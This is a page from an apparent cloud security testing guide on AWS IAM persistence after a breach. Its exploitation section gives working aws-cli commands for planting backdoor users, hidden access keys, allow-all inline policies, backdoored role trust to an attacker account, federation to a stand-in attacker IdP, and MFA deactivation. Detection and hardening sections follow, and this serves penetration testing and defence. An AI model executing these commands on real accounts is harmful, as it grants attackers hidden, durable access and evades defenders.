---
cstg_id: CSTG-AWS-IAM-PERSIST
title: "AWS Iam - Persistence"
provider: aws
service: iam
phase: persistence
required_access: assumed-breach
required_permissions:
  - iam:CreateUser
  - iam:CreateAccessKey
  - iam:CreateLoginProfile
  - iam:UpdateLoginProfile
  - iam:AttachUserPolicy
  - iam:PutUserPolicy
  - iam:CreateRole
  - iam:UpdateAssumeRolePolicy
  - iam:PutRolePolicy
  - iam:CreatePolicyVersion
  - iam:UploadSSHPublicKey
  - iam:CreateServiceSpecificCredential
  - iam:DeactivateMFADevice
tools:
  - aws-cli
  - pacu
  - principal-mapper (pmapper)
references:
  - "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html"
  - "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-idp_oidc.html"
  - "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_ssh-keys.html"
  - "https://hackingthe.cloud/aws/post_exploitation/backdoor_iam_roles_and_users/"
  - "https://github.com/RhinoSecurityLabs/pacu"
license: CC BY-SA 4.0
---

## Summary

IAM persistence is the establishment of durable, recoverable access that survives the loss of the original foothold - for example after a single compromised key is rotated or revoked. Because IAM controls authentication and authorization, an actor with IAM write permissions can plant numerous independent re-entry points: extra access keys, new users, console passwords, backdoored trust policies, hidden inline policies, federated trust to an external identity provider, SSH/service-specific credentials, and MFA changes. Each is intended to remain usable, and each is designed to blend into normal IAM state.

The attacker objective is to create one or more credentials or trust edges that the defender is unlikely to find and that re-grant access on demand. This page catalogues the common IAM persistence mechanisms with concrete commands. Privilege required to plant them overlaps with [Privilege Escalation](../03-privilege-escalation/aws-iam-privesc.md); the goal here is durability rather than elevation.

## Prerequisites

- An assumed-breach foothold with IAM write permissions appropriate to the chosen mechanism (for example `iam:CreateAccessKey`, `iam:CreateUser`, `iam:CreateRole`, `iam:UpdateAssumeRolePolicy`, or `iam:PutUserPolicy`).
- For federation-based persistence: the ability to create/associate an OIDC or SAML identity provider and a role trusting it.
- Knowledge of naming conventions in the account so planted artifacts blend in (gathered during [Enumeration](../02-services/aws-iam-enum.md)).

## Misconfigurations & Findings

- Principals with standing IAM write permissions and no change-monitoring, allowing silent creation of credentials and trust edges.
- Users permitted to hold **two** active access keys, enabling a hidden second key alongside a legitimate one.
- No alerting on `CreateUser`, `CreateAccessKey`, `CreateLoginProfile`, `UpdateAssumeRolePolicy`, or OIDC/SAML provider creation.
- Trust policies that can be widened to external accounts or providers without review.
- No periodic reconciliation of IAM state against an approved baseline.

## Exploitation

### Second access key on an existing identity

The quietest mechanism: add a second key to an existing (often service) user. It is valid indefinitely and looks like a normal key:

```bash
aws iam create-access-key --user-name <existing-user>
```

### New backdoor user with admin

```bash
aws iam create-user --user-name svc-monitoring        # innocuous name
aws iam attach-user-policy --user-name svc-monitoring \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name svc-monitoring
```

### Console password on a programmatic-only user

Add a login profile so the identity can also be used interactively:

```bash
aws iam create-login-profile --user-name <user> --password '<P@ss>' --no-password-reset-required
# or reset an existing one:
aws iam update-login-profile --user-name <user> --password '<P@ss>'
```

### Backdoored role trust policy

Add an external principal (or the attacker's own account) to a role's trust policy so it can be assumed at will, even after the original key dies:

```bash
aws iam update-assume-role-policy --role-name <existing-role> \
  --policy-document '{"Version":"2012-10-17","Statement":[
    {"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<attacker-acct>:root"},"Action":"sts:AssumeRole"}]}'
```

### Hidden inline policy

Inline policies are not listed by `list-policies` and are easy to miss in reviews; embed a quiet grant on a low-profile principal:

```bash
aws iam put-user-policy --user-name <low-profile-user> --policy-name diagnostics \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

### New version of an existing managed policy

Append a permissive version and set it default; the policy still appears legitimately attached:

```bash
aws iam create-policy-version --policy-arn <existing-policy-arn> \
  --policy-document file://admin.json --set-as-default
```

### Federated persistence via OIDC/SAML

Associate an attacker-controlled identity provider and create a role trusting it; the attacker then re-enters indefinitely with a token from their own IdP, holding no AWS credentials in the account:

```bash
aws iam create-open-id-connect-provider \
  --url https://attacker-idp.example --client-id-list sts.amazonaws.com \
  --thumbprint-list <thumbprint>
aws iam create-role --role-name svc-ci --assume-role-policy-document file://oidc-trust.json
aws iam attach-role-policy --role-name svc-ci --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### SSH public keys and service-specific credentials

For CodeCommit and similar services, upload an SSH key or create service-specific credentials that survive console/key rotation:

```bash
aws iam upload-ssh-public-key --user-name <user> --ssh-public-key-body file://id.pub
aws iam create-service-specific-credential --user-name <user> --service-name codecommit.amazonaws.com
```

### Weakening MFA

Deactivating or removing an MFA device on a controlled user keeps re-entry simple if the account later enforces MFA inconsistently:

```bash
aws iam deactivate-mfa-device --user-name <user> --serial-number <arn-or-serial>
```

## Detection & Logging

- **CloudTrail** (global IAM events, `us-east-1`) records each mechanism: `CreateUser`, `CreateAccessKey`, `CreateLoginProfile`, `UpdateLoginProfile`, `AttachUserPolicy`, `PutUserPolicy`, `PutRolePolicy`, `CreateRole`, `UpdateAssumeRolePolicy`, `CreatePolicyVersion`/`SetDefaultPolicyVersion`, `CreateOpenIDConnectProvider`, `CreateSAMLProvider`, `UploadSSHPublicKey`, `CreateServiceSpecificCredential`, and `DeactivateMFADevice`.
- High-signal patterns: `CreateAccessKey` producing a *second* key for an existing user; `CreateUser` followed by `AttachUserPolicy` with `AdministratorAccess`; `UpdateAssumeRolePolicy` adding an external account/provider principal; creation of an OIDC/SAML provider; `PutUserPolicy` adding an allow-all inline policy.
- Correlate the planting principal across events - a single non-admin identity touching multiple of these in a short window is a strong persistence indicator.
- **GuardDuty** raises `Persistence:IAMUser/AnomalousBehavior` and administrative-permission findings for these patterns; **IAM Access Analyzer** flags newly externalized trust on roles, providers, and policies.
- A **credential report** diff and IAM Access Analyzer unused/external findings expose planted users, keys, and trust edges over time.

## Remediation & Hardening

- Restrict standing IAM write permissions to a small, monitored administrative set; use SCPs and permission boundaries to cap reach.
- Alert in near-real-time on the CloudTrail events above, especially access-key creation, new users, trust-policy changes, and identity-provider creation.
- Enforce single-active-key policies and short key lifetimes; prefer temporary federated credentials over long-term keys.
- Periodically reconcile users, keys, inline policies, policy versions, role trust policies, and identity providers against an approved baseline (infrastructure-as-code drift detection).
- Use IAM Access Analyzer to continuously detect externalized trust and unused access; require MFA and monitor `DeactivateMFADevice`.
- During incident response, rotate all keys, remove unexpected users/keys/inline policies/policy versions, revert trust policies, and delete unrecognized identity providers - not just the originally compromised credential.

## Tools

- **aws-cli** - executes every persistence mechanism above.
- **pacu** - includes backdoor-user, backdoor-role-trust, and persistence modules.
- **principal-mapper (pmapper)** - verifies that planted artifacts retain the intended reach and helps defenders find them.

## References

- AWS IAM User Guide - Managing access keys
- AWS IAM User Guide - Creating a role for OIDC federation
- AWS IAM User Guide - SSH keys and CodeCommit
- hackingthe.cloud - Backdoor IAM roles and users
- Rhino Security Labs - Pacu
